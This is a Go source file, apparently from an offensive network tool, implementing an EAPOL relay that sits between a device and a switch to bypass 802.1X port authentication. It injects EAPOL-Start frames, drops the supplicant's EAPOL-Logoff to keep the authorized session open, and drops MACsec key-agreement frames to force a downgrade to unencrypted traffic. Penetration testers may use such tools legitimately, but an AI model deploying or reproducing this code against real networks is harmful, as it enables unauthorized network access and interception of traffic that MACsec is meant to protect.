package eapol

import (
	"context"
	"fmt"
	"net"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Relay transparently forwards EAPOL frames between the supplicant (real device)
// on ifaceA and the authenticator (switch) on ifaceB.
//
// The relay is bidirectional:
//   - Switch→Device: EAPOL frames arriving on ifaceB are injected onto ifaceA
//   - Device→Switch: EAPOL frames arriving on ifaceA are injected onto ifaceB
//
// The relay also monitors the exchange:
//   - Detects EAP-Success/Failure to signal auth complete
//   - Detects EAPOL-Key (MKA) for MACsec negotiation
//   - Handles re-authentication transparently
//   - Optionally suppresses EAPOL-Logoff from the supplicant
type Relay struct {
	ifaceA  string // Device port (supplicant side)
	ifaceB  string // Switch port (authenticator side)
	session *AuthSession
	logFunc func(string)

	mu               sync.Mutex
	suppressLogoff   bool
	downgrader       *Downgrader
	authSignal       chan AuthResult

	// Log deduplication
	lastReqMethod  EAPMethod
	lastRespMethod EAPMethod
	startLoggedDev bool
	startLoggedSwi bool
	successLogged  bool
	failureLogged  bool
}

// NewRelay creates a new EAPOL relay between two interfaces.
// ifaceA = device/supplicant side, ifaceB = switch/authenticator side.
func NewRelay(ifaceA, ifaceB string, session *AuthSession, logFunc func(string)) *Relay {
	if logFunc == nil {
		logFunc = func(string) {}
	}
	return &Relay{
		ifaceA:         ifaceA,
		ifaceB:         ifaceB,
		session:        session,
		logFunc:        logFunc,
		suppressLogoff: true, // Default: suppress logoff to keep session alive
		authSignal:     make(chan AuthResult, 8), // Buffered to avoid dropping re-auth results
	}
}

// SetSuppressLogoff controls whether EAPOL-Logoff from the supplicant is dropped.
func (r *Relay) SetSuppressLogoff(suppress bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.suppressLogoff = suppress
}

// EnableDowngrade activates MACsec downgrade (drops EAPOL-Key/MKA frames).
func (r *Relay) EnableDowngrade() {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.downgrader = NewDowngrader()
	r.session.SetState(StateDowngrading)
	r.logFunc("[MACSEC] Downgrade enabled: EAPOL-Key/MKA frames will be dropped.")
}

// Start begins bidirectional EAPOL relay. This runs until the context is cancelled.
// It handles the full lifecycle including initial auth, re-auth, and logoff suppression.
func (r *Relay) Start(ctx context.Context) error {
	r.session.SetState(StateRelaying)

	// Open raw pcap handles on both interfaces for EAPOL.
	handleA, err := pcap.OpenLive(r.ifaceA, 65535, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("opening %s for EAPOL relay: %w", r.ifaceA, err)
	}
	defer handleA.Close()

	handleB, err := pcap.OpenLive(r.ifaceB, 65535, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("opening %s for EAPOL relay: %w", r.ifaceB, err)
	}
	defer handleB.Close()

	// BPF filter on both to only see EAPOL frames.
	if err := handleA.SetBPFFilter(BPFFilter); err != nil {
		return fmt.Errorf("BPF filter on %s: %w", r.ifaceA, err)
	}
	if err := handleB.SetBPFFilter(BPFFilter); err != nil {
		return fmt.Errorf("BPF filter on %s: %w", r.ifaceB, err)
	}

	r.logFunc(fmt.Sprintf("[RELAY] EAPOL relay active: %s (device) ⟷ %s (switch)", r.ifaceA, r.ifaceB))

	// Inject an EAPOL-Start on the switch port to prompt the authenticator.
	// Some switches won't send EAP-Request/Identity until they see EAPOL-Start.
	if r.session.SupplicantMAC != nil {
		if err := InjectEAPOLStart(r.ifaceB, r.session.SupplicantMAC, r.logFunc); err != nil {
			r.logFunc(fmt.Sprintf("[!][802.1X] EAPOL-Start injection failed (non-fatal): %v", err))
		}
	}

	// Launch two goroutines for bidirectional relay.
	var wg sync.WaitGroup
	wg.Add(2)

	// Switch→Device: frames from authenticator relayed to supplicant.
	go func() {
		defer wg.Done()
		r.relayDirection(ctx, handleB, handleA, "switch→device")
	}()

	// Device→Switch: frames from supplicant relayed to authenticator.
	go func() {
		defer wg.Done()
		r.relayDirection(ctx, handleA, handleB, "device→switch")
	}()

	wg.Wait()
	return nil
}

// WaitForAuth blocks until authentication succeeds, fails, or the context is cancelled.
func (r *Relay) WaitForAuth(ctx context.Context) (*AuthResult, error) {
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case result := <-r.authSignal:
		return &result, nil
	}
}

// relayDirection forwards EAPOL frames from src to dst, inspecting them along the way.
func (r *Relay) relayDirection(ctx context.Context, src, dst *pcap.Handle, label string) {
	packetSource := gopacket.NewPacketSource(src, src.LinkType())
	packets := packetSource.Packets()

	for {
		select {
		case <-ctx.Done():
			return
		case packet := <-packets:
			if packet == nil {
				continue
			}

			ethLayer := packet.Layer(layers.LayerTypeEthernet)
			if ethLayer == nil {
				continue
			}
			eth, _ := ethLayer.(*layers.Ethernet)

			eapolLayer := packet.Layer(layers.LayerTypeEAPOL)
			if eapolLayer == nil {
				continue
			}
			eapol, _ := eapolLayer.(*layers.EAPOL)

			// ── Inspect the EAPOL frame ────────────────────────────────

			shouldDrop := false

			switch eapol.Type {
			case layers.EAPOLTypeEAP:
				r.handleEAPFrame(packet, eth, label)

			case layers.EAPOLTypeStart:
				r.mu.Lock()
				shouldLog := false
				if label == "device→switch" && !r.startLoggedDev {
					r.startLoggedDev = true
					shouldLog = true
				} else if label == "switch→device" && !r.startLoggedSwi {
					r.startLoggedSwi = true
					shouldLog = true
				}
				r.mu.Unlock()
				if shouldLog {
					r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Start from %s", label, eth.SrcMAC))
				}

			case layers.EAPOLTypeLogOff:
				r.mu.Lock()
				suppress := r.suppressLogoff
				r.mu.Unlock()

				if suppress {
					r.logFunc(fmt.Sprintf("[!][RELAY] %s: EAPOL-Logoff received from %s", label, eth.SrcMAC))
					r.logFunc("           DROPPING PACKET to keep session alive")
					r.session.RecordDrop()
					shouldDrop = true
				} else {
					r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Logoff from %s — forwarding", label, eth.SrcMAC))
				}

			case layers.EAPOLTypeKey, layers.EAPOLType(5):
				// Always track MACsec presence.
				r.session.mu.Lock()
				isFirstTime := !r.session.MACsecDetected
				r.session.MACsecDetected = true
				r.session.mu.Unlock()

				r.mu.Lock()
				dg := r.downgrader
				r.mu.Unlock()

				// Use the Downgrader's ShouldDrop to decide, keeping logic in one place.
				isDroppedByRule := dg != nil && dg.ShouldDrop(packet)

				if isDroppedByRule {
					r.logFunc(fmt.Sprintf("[!][MACSEC] %s: MACsec (EAPOL Type %d) discovered. DROPPING PACKET to force downgrade", label, eapol.Type))
					r.session.RecordDrop()
					shouldDrop = true
				} else if isFirstTime {
					if dg == nil || !dg.IsEnabled() {
						r.logFunc(fmt.Sprintf("[MACSEC] %s: MACsec (EAPOL Type %d) key negotiation detected but DWNGRD IS DISABLED on proxy", label, eapol.Type))
					} else {
						// Downgrade is active, but this packet type (e.g. Type 3) is allowed to securely pass.
						r.logFunc(fmt.Sprintf("[MACSEC] %s: MACsec (EAPOL Type %d) key negotiation safely bypassed from %s", label, eapol.Type, eth.SrcMAC))
					}
				}
			}

			// ── Forward the frame ──────────────────────────────────────

			if !shouldDrop {
				rawData := packet.Data()
				if err := dst.WritePacketData(rawData); err != nil {
					r.logFunc(fmt.Sprintf("[RELAY] %s: injection error: %v", label, err))
				} else {
					r.session.RecordRelay()
				}
			}
		}
	}
}

// handleEAPFrame inspects an EAP frame inside an EAPOL packet.
func (r *Relay) handleEAPFrame(packet gopacket.Packet, eth *layers.Ethernet, label string) {
	eapLayer := packet.Layer(layers.LayerTypeEAP)
	if eapLayer == nil {
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-EAP frame (no EAP layer parsed) from %s", label, eth.SrcMAC))
		return
	}

	eap, _ := eapLayer.(*layers.EAP)

	// Track the authenticator MAC from the switch side.
	if label == "switch→device" {
		r.session.mu.Lock()
		if len(r.session.AuthenticatorMAC) == 0 {
			r.session.AuthenticatorMAC = copyMAC(eth.SrcMAC)
		}
		r.session.mu.Unlock()
	}

	// Track the EAP ID for session correlation.
	r.session.mu.Lock()
	r.session.LastEAPID = eap.Id
	r.session.mu.Unlock()

	switch eap.Code {
	case layers.EAPCodeRequest:
		method := eapTypeToMethod(uint8(eap.Type))
		r.mu.Lock()
		r.startLoggedDev = false
		r.startLoggedSwi = false
		r.successLogged = false
		r.failureLogged = false
		if r.lastReqMethod != method {
			r.lastReqMethod = method
			// Included the ID previously, but removed for dedup since fragment IDs change constantly.
			r.logFunc(fmt.Sprintf("[RELAY] %s: EAP-Request Type=%s from %s", label, method, eth.SrcMAC))
		}
		r.mu.Unlock()

		// Update method if we see something more specific than Identity.
		if method != MethodUnknown && method != MethodIdentity {
			r.session.mu.Lock()
			if r.session.Method == MethodUnknown || r.session.Method == MethodIdentity {
				r.session.Method = method
				r.logFunc(fmt.Sprintf("[+][802.1X] EAP method negotiated: %s", method))
			}
			r.session.mu.Unlock()
		} else if method == MethodIdentity {
			r.session.mu.Lock()
			if r.session.Method == MethodUnknown {
				r.session.Method = MethodIdentity
			}
			// Check if this is a re-auth (we were already authenticated).
			if r.session.State == StateAuthenticated {
				r.session.ReauthCount++
				r.session.State = StateRelaying
				r.logFunc(fmt.Sprintf("[*][802.1X] Re-authentication #%d initiated by authenticator", r.session.ReauthCount))
			}
			r.session.mu.Unlock()
		}

	case layers.EAPCodeResponse:
		method := eapTypeToMethod(uint8(eap.Type))
		r.mu.Lock()
		if r.lastRespMethod != method {
			r.lastRespMethod = method
			r.logFunc(fmt.Sprintf("[RELAY] %s: EAP-Response Type=%s from %s", label, method, eth.SrcMAC))
		}
		r.mu.Unlock()

	case layers.EAPCodeSuccess:
		r.mu.Lock()
		shouldLog := !r.successLogged
		r.successLogged = true
		r.mu.Unlock()
		if shouldLog {
			r.logFunc(fmt.Sprintf("[+][802.1X] EAP-Success received (ID=%d) port AUTHORIZED", eap.Id))
		}
		r.session.MarkAuthenticated()

		// Non-blocking send so the relay doesn't deadlock if nobody is waiting.
		r.session.mu.Lock()
		method := r.session.Method
		macsec := r.session.MACsecDetected
		r.session.mu.Unlock()
		select {
		case r.authSignal <- AuthResult{Success: true, Method: method, MACsecDetected: macsec}:
		default:
		}

	case layers.EAPCodeFailure:
		r.mu.Lock()
		shouldLog := !r.failureLogged
		r.failureLogged = true
		r.mu.Unlock()
		if shouldLog {
			r.logFunc(fmt.Sprintf("[!][802.1X] EAP-Failure received (ID=%d) — authentication REJECTED", eap.Id))
		}
		r.session.MarkFailed()

		r.session.mu.Lock()
		method := r.session.Method
		macsec := r.session.MACsecDetected
		r.session.mu.Unlock()
		select {
		case r.authSignal <- AuthResult{Success: false, Method: method, MACsecDetected: macsec}:
		default:
		}
	}
}

// copyMAC creates an independent copy of a MAC address.
func copyMAC(mac net.HardwareAddr) net.HardwareAddr {
	dup := make(net.HardwareAddr, len(mac))
	copy(dup, mac)
	return dup
}
